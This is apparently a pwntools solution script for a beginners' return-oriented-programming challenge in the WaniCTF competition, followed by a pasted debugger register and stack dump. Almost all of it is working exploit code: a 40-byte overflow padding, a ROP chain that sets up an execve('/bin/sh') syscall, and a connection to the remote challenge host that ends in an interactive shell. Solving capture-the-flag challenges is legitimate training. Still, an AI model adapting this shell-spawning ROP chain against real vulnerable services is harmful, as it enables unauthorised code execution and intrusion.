from pwn import *

exe = ELF("./chall")
rop = ROP(exe)
context.binary = exe

# io = process([exe.path])
io = remote("beginners-rop-pwn.wanictf.org", 9005)

pop_rax_ret = p64(0x0000000000401369 + 0x8)
xor_rsi_ret = p64(0x0000000000401376 + 0x8)
xor_rdx_ret = p64(0x0000000000401385 + 0x8)
mov_rsp_rdi_pop_ret = p64(0x0000000000401394 + 0x8)
syscall_ret = p64(0x00000000004013a7 + 0x8)

offset = 40
message = b''
message += b'AAA%AAsAABAA$AAnAACAA-AA(AADAA;AA)AAEAAa'
message += pop_rax_ret
message += p64(0x3b)
message += xor_rsi_ret
message += xor_rdx_ret
message += mov_rsp_rdi_pop_ret
# message += p64(0x68732f2f6e69622f)
# message += p64(0x68732f6e69622fff)
message += p64(0x0068732f6e69622f)

message += syscall_ret

io.recvuntil(b'>')
print(message)
io.sendline(message)
io.interactive()

"""
[----------------------------------registers-----------------------------------]
RAX: 0x3b (';')
RBX: 0x401480 (<__libc_csu_init>:       endbr64)
RCX: 0x7fc560f54fd2 (<__GI___libc_read+18>:     cmp    rax,0xfffffffffffff000)
RDX: 0x0 
RSI: 0x0 
RDI: 0x7ffdb58efd60 --> 0x68732f6e69622fff 
RBP: 0x6141414541412941 ('A)AAEAAa')
RSP: 0x7ffdb58efd70 --> 0x4010f0 (<_start>:     endbr64)
RIP: 0x401394 (<syscall_ret+8>: syscall)
R8 : 0x1d 
R9 : 0x1d 
R10: 0x400515 --> 0x6474730064616572 ('read')
R11: 0x246 
R12: 0x4010f0 (<_start>:        endbr64)
R13: 0x7ffdb58efe20 --> 0x1 
R14: 0x0 
R15: 0x0
EFLAGS: 0x202 (carry parity adjust zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x40138c <syscall_ret>:      endbr64 
   0x401390 <syscall_ret+4>:    push   rbp
   0x401391 <syscall_ret+5>:    mov    rbp,rsp
=> 0x401394 <syscall_ret+8>:    syscall 
   0x401396 <syscall_ret+10>:   ret    
   0x401397 <syscall_ret+11>:   nop
   0x401398 <syscall_ret+12>:   pop    rbp
   0x401399 <syscall_ret+13>:   ret
Guessed arguments:
arg[0]: 0x7ffdb58efd60 --> 0x68732f6e69622fff 
[------------------------------------stack-------------------------------------]
0000| 0x7ffdb58efd70 --> 0x4010f0 (<_start>:    endbr64)
0008| 0x7ffdb58efd78 --> 0x7ffdb58efe20 --> 0x1 
0016| 0x7ffdb58efd80 --> 0x0 
0024| 0x7ffdb58efd88 --> 0x0 
0032| 0x7ffdb58efd90 --> 0x7e04aaf9762f3243 
0040| 0x7ffdb58efd98 --> 0x7e750029ecc13243 
0048| 0x7ffdb58efda0 --> 0x0 
0056| 0x7ffdb58efda8 --> 0x0 
[------------------------------------------------------------------------------]
"""